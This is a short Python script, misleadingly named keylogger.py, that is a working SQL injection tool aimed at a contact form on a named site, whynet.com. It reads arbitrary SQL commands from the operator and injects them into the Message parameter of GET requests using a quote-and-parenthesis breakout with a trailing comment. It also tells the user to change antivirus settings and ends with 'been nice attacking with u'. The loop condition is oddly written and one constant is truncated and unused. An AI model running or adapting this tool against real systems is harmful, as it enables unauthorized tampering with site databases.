# Name: keylogger.py
# Author: dipper
# Date: 2.6.2026
# Description: does sqli to the whynet site
# imports
#sqli
import requests
from requests.auth import HTTPBasicAuth
import urllib.parse



# CONSTANTS
GOOD_STATUSE_CODE = 200
SQLI_MESSAGE = r"'); ALTER TABLE dbo.CotactUs ADD Ne"
USER_COMMAND_MESSAGE = "enter wanted SQL command (exit to exit), [example query: ALTER TABLE dbo.ContactUs ADD NewNew int; ]\n"
burp0_headers = {"Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://www.whynet.com/contact.php", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}




def main():
    user_command,user_command_url = None, None

    print ("be ware to chnge virus and thret protection settings")

    
    user_command = input(USER_COMMAND_MESSAGE)
    user_command_url = urllib.parse.quote(user_command)

    # run through the list
    while (user_command != user_command.lower()):
        try:
            burp0_url_SQLI = (fr"http://www.whynet.com:80/AddToContact.php?Name=ee&Email=ee&Subject=ee&Message=%27%29%3B+{user_command_url}--")

            # makes a get request
            requests.get(burp0_url_SQLI, headers=burp0_headers)
            user_command = input(USER_COMMAND_MESSAGE)
            user_command_url = urllib.parse.quote(user_command)

        #in case of syntax error or somthing like it
        except:
                print ("error acoured \ntry again")
    input("been nice attackingwith u \nbye")


if __name__=="__main__":
    main()